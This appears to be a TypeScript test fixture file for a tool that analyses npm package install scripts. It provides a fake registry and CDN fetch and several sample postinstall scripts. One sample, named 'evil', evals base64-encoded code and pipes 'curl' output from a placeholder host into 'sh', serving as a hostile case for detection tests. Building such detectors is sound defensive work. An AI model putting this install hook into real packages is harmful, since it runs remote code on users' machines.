import type { FetchLike } from '../src/core/sources';

export interface FakePackage {
  scripts?: Record<string, string>;
  gypfile?: boolean;
  os?: string[];
  files?: Record<string, string>;
}

export interface FakeFetch extends FetchLike {
  calls: string[];
}

/** Answers like registry.npmjs.org/<name>/<version> and cdn.jsdelivr.net/npm/<name>@<version>/<path>. */
export function fakeFetch(
  packages: Record<string, FakePackage>,
  options: { failRegistry?: boolean } = {},
): FakeFetch {
  const calls: string[] = [];
  const fn = (async (url: string) => {
    calls.push(url);
    const reg = /^https:\/\/registry\.npmjs\.org\/(.+)\/([^/]+)$/.exec(url);
    if (reg) {
      if (options.failRegistry) return new Response('down', { status: 503 });
      const name = decodeURIComponent(reg[1]!);
      const pkg = packages[`${name}@${decodeURIComponent(reg[2]!)}`];
      if (!pkg) return new Response('{}', { status: 404 });
      return new Response(
        JSON.stringify({ scripts: pkg.scripts, gypfile: pkg.gypfile, os: pkg.os }),
      );
    }
    const cdn = /^https:\/\/cdn\.jsdelivr\.net\/npm\/((?:@[^/]+\/)?[^@/]+)@([^/]+)\/(.+)$/.exec(
      url,
    );
    if (cdn) {
      const text = packages[`${cdn[1]}@${cdn[2]}`]?.files?.[cdn[3]!];
      return text === undefined ? new Response('not found', { status: 404 }) : new Response(text);
    }
    throw new Error(`unexpected fetch ${url}`);
  }) as FakeFetch;
  fn.calls = calls;
  return fn;
}

/** Real script files (trimmed) from the packages named, used as fixtures. */
export const FILES = {
  coreJsPostinstall: `'use strict';
var fs = require('fs');
var env = process.env;
var ADBLOCK = is(env.ADBLOCK);
function is(it) { return !!it && it !== '0' && it !== 'false'; }
if (!ADBLOCK) console.log('Thank you for using core-js ( https://github.com/zloirock/core-js ) for polyfilling JavaScript standard library!');
`,
  sentryInstall: `#!/usr/bin/env node
'use strict';
const fs = require('fs');
const { ProxyAgent, fetch } = require('undici');
async function download() {
  const response = await fetch(url, { dispatcher: new ProxyAgent() });
  fs.writeFileSync(target, Buffer.from(await response.arrayBuffer()));
}
`,
  napiStub: `const { checkAndPreparePackage } = require("napi-postinstall");
const packageJson = require("./package.json");
checkAndPreparePackage(packageJson, true);
`,
  es5ext: `#!/usr/bin/env node
// Broadcasts "Call for peace" message when package is installed in Russia, otherwise no-op
"use strict";
try { if (["Europe/Moscow"].includes(Intl.DateTimeFormat().resolvedOptions().timeZone)) console.log("Call for peace"); } catch (e) {}
`,
  evil: `const c = require('child_process');
eval(Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString());
c.execSync('curl -s https://example.invalid/x | sh');
`,
  delegating: `// Install the platform build.
require('./lib/install.js');
`,
  libInstall: `const https = require('https');
const fs = require('fs');
https.get(url, (res) => res.pipe(fs.createWriteStream(dest)));
`,
};
